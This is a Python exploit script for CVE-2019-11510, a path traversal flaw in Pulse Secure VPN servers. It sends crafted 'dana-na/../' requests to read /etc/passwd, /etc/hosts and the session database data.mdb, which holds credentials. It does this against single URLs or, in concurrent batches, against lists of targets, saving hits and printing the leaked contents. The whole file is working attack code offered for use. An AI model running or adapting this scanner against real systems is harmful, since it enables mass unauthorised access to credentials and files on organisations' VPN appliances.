#@author:九世
#@time:2019/8/28
#@file:exp.py
'''
CVE:CVE-2019-11510-1
参考:
https://hackerone.com/reports/591295
https://github.com/projectzeroindia/CVE-2019-11510
'''
from gevent import monkey;monkey.patch_all()
from gevent.lock import RLock
from multiprocessing import Process
import gevent
import requests
import optparse
import warnings
import os
warnings.filterwarnings("ignore")

lock=RLock()
class Exploit(object):
    def __init__(self):
        self.path=['dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/',
                   'dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/',
                   'dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/,'
                   'dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/',
                   'dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/',
                   'dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/']

        self.headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'}
        self.http_statcode=200
        self.djcs=[]
        self.xcs=[]
        self.calc=0

    def command(self):
        onage='''
        python exp.py -u [url] #Single detection
        python exp.py -f [file] #Batch testing
        '''
        parser=optparse.OptionParser(onage)
        parser.add_option('-u',dest='url',help='Single detection')
        parser.add_option('-f',dest='file',help='Batch testing')
        (options,args)=parser.parse_args()
        if options.url:
            for path in self.path:
                url=str(options.url).rstrip('/')+'/'+path
                self.scan(url)
        elif options.file:
            file_name=options.file
            if os.path.exists(file_name):
                print('[+] Found file:{}'.format(file_name))
                self.djc(name=file_name,rw=self.path)
            else:
                print('[-] Not Found file:{}'.format(file_name))
                exit()
        else:
            parser.print_help()

    def scan(self,url):
        try:
            rqt=requests.get(url=url,headers=self.headers,verify=False,allow_redirects=False,timeout=3)
            if rqt.status_code==self.http_statcode and len(rqt.text)>0:
                if 'root:x' in rqt.text or 'localhost' in rqt.text:
                    print('[+] url:{}'.format(url))
                    print('[+] url:{}'.format(url),file=open('save.txt','a',encoding='utf-8'))
                    print('-------------------------------------')
                    print(rqt.text)
            else:
                print('[-] url:{} http_code:{}'.format(rqt.url,rqt.status_code))
        except Exception as r:
            print('[-] Error:{}'.format(r))

    def djc(self,name,rw):
        dq = open(name,'r',encoding='utf-8')
        for q in dq.readlines():
            for j in rw:
                url = "".join(q.split('\n'))
                if self.calc==30:
                    p=Process(target=self.xc,args=(self.djcs,))
                    p.start()
                    self.djcs.clear()
                    self.calc=0
                urls=str(url).rstrip('/')+'/'+j
                self.djcs.append(urls)
                self.calc+=1

            if len(self.djcs)>0:
                p = Process(target=self.xc, args=(self.djcs,))
                p.start()


    def xc(self,rw):
        lock.acquire()
        for r in rw:
            self.xcs.append(gevent.spawn(self.scan,r))
        lock.release()

        gevent.joinall(self.xcs)

if __name__ == '__main__':
    obj=Exploit()
    obj.command()